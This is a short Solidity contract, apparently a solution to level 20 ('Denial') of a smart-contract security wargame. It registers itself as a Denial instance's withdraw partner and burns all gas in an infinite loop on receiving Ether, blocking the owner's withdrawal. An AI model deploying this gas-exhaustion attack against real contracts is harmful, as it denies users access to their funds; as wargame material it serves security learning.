// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level20.sol";

contract DenialHack {

  Denial public denialInstance = Denial(payable(0xB65dAA8368bD05b47F2970339a6cf5300914DC52));

  function setWithdrawPartner() public 
  {
    denialInstance.setWithdrawPartner(address(this));
  }

  receive() external payable {
    while(true) { }
  }

}